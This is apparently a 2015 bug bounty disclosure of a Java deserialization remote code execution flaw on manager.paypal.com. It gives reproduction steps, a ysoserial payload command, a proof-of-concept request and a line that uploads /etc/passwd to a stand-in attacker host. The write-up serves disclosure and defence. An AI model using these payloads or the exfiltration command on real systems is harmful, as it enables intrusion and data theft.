# Title: Remote Code Execution via Java Deserialization on manager.paypal.com

- **Platform**: PayPal Bug Bounty
- **Program**: PayPal Bug Bounty Program
- **Severity**: Critical
- **Date**: 2015-12-13
- **Researcher**: Michael Stepankin (artsploit)
- **Bounty**: $5,000 (duplicate, paid anyway)

## Summary
A critical Java deserialization vulnerability was discovered on manager.paypal.com. The application accepted base64-encoded serialized Java objects in the `oldFormData` POST parameter. By crafting malicious serialized objects using the Commons Collections gadget chain, arbitrary OS commands could be executed.

## Technical Details
The `oldFormData` parameter in the manager.paypal.com application was base64-decoded and deserialized by the server without any validation. The parameter contained a Java serialized object (Java serialization stream). The researcher recognized this as a potential Java deserialization vulnerability.

Using the ysoserial tool (created by Chris Frohoff and Gabriel Lawrence), the researcher generated payloads that exploited gadget chains in the Apache Commons Collections library. These gadget chains, when deserialized, would execute arbitrary commands through the `readObject` method.

## Steps to Reproduce
1. Intercept a POST request to manager.paypal.com
2. Identify the `oldFormData` parameter containing base64 data
3. Decode the base64 to confirm it's a Java serialized object
4. Use ysoserial to generate a payload: `java -jar ysoserial.jar CommonsCollections1 'curl x.s.artsploit.com/paypal' | base64`
5. Replace the `oldFormData` value with the malicious payload
6. Send the request
7. Monitor the attacker server for incoming connections from PayPal

## Proof of Concept
```
POST /manager HTTP/1.1
Host: manager.paypal.com
Content-Type: application/x-www-form-urlencoded

oldFormData=<base64_encoded_ysoserial_payload>
```

The researcher executed `curl x.s.artsploit.com/paypal` and observed the incoming request in NGINX access logs. The server response confirmed command execution. Further exploitation included reading `/etc/passwd`:
```
curl -F "file=@/etc/passwd" http://attacker.com/upload
```

## Impact
- Arbitrary OS command execution on PayPal production web servers
- Access to production databases used by manager.paypal.com
- Full server compromise
- Potential lateral movement to internal network
- Data theft and exfiltration

## Remediation
PayPal mitigated the vulnerability by:
1. Disabling Java deserialization of untrusted data
2. Implementing input validation on the `oldFormData` parameter
3. Using a deserialization filter (ObjectInputFilter)
4. Upgrading Commons Collections library to patched versions

## References
- https://artsploit.blogspot.com/2016/01/paypal-rce.html
- https://seclists.org/fulldisclosure/2015/Apr/98
